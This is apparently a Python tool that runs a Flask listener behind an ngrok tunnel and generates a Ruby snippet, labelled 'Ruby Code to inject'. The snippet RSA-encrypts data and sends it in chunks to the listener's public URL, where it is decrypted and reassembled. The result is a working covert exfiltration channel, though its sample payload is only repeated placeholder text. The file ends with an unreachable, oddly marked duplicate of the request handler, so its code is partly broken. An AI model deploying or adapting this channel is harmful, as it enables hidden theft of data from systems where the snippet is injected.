#!/usr/bin/env python3

from flask import Flask, request
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
import base64
from collections import defaultdict
import sys
import time
import requests
import json

def get_ngrok_url():
    ngrok_api = 'http://127.0.0.1:4040/api/tunnels'
    retries = 10
    wait_seconds = 2

    for _ in range(retries):
        try:
            response = requests.get(ngrok_api)
            tunnels = json.loads(response.text).get('tunnels', [])
            for tunnel in tunnels:
                if tunnel['proto'] == 'https':
                    return tunnel['public_url']
        except requests.ConnectionError:
            pass
        time.sleep(wait_seconds)

    print("Failed to retrieve ngrok URL.")
    sys.exit(1)

hostname = get_ngrok_url()
print(f"Ngrok URL: {hostname}")


app = Flask(__name__)

# Step 1: Generate an asymmetric keypair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

pub = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode().replace("\n", "\\n")
ruby_code = f'''
require 'openssl'
require 'base64'
require 'net/http'
require 'uri'

payload = "hello world " * 1000
public_key = OpenSSL::PKey::RSA.new("{pub}")
chunks = payload.scan(/.{"{"}1,#{"{"}public_key.n.num_bytes - 42{"}"}{"}"}/)
midx = (0...10).map {"{"} ('a'..'z').to_a[rand(26)] {"}"}.join
chunks.each_with_index {"{"} |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("{hostname}/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts "==> " + response.code + ": [" + response.body + "]" {"}"}
'''

print(f"Ruby Code to inject, for safe transmission:\n=================================\n{ruby_code}\n=================================\n")

# Create a dictionary to store the chunks for each message ID
message_chunks = defaultdict(list)

# Step 2: Implement Flask server
@app.route('/', methods=['GET'])
def handle_request():
    try:
        encrypted_data = request.args.get('n')
        message_id = request.args.get('m')
        chunk_index = int(request.args.get('x'))
        total_chunks = int(request.args.get('z'))

        # print(f"Received encrypted data: {encrypted_data}")  # Logging the received data

        encrypted_data_bytes = base64.b64decode(encrypted_data)
        # print(f"Decoded encrypted data bytes: {encrypted_data_bytes}")  # Logging the decoded bytes

        decrypted_data = private_key.decrypt(
            encrypted_data_bytes,
            padding.PKCS1v15()  # Using PKCS#1 v1.5 padding for decryption
        )
        num_bytes = len(decrypted_data)

        # Store the decrypted chunk for the corresponding message ID
        message_chunks[message_id].append(decrypted_data)

        print(f" ==> Decrypted data for message: #{message_id} part {chunk_index + 1} ({len(message_chunks[message_id])}/{total_chunks}) -> {num_bytes} bytes")  # Logging the decrypted data

        # Check if we have received all the chunks for the message ID
        if len(message_chunks[message_id]) == total_chunks:
            # Concatenate all the chunks to form the complete message
            complete_message = b''.join(message_chunks[message_id])
            print(f"Complete message for message ID {message_id}:\n=================================\n{complete_message.decode()}\n=================================\n")

        # flush STDOUT to avoid buffering issues
        sys.stdout.flush()

        return f"Recieved and decrypted {num_bytes} bytes"
    except Exception as e:
        print(f"Error: {str(e)}")  # Detailed error logging
        return f"Decryption failed: {str(e)}", 500


if __name__ == '__main__':
    app.run()
    # BEGIN: ed8c6549bwf9
    def handle_request():
        message_chunks = defaultdict(list)
        # END: ed8c6549bwf9


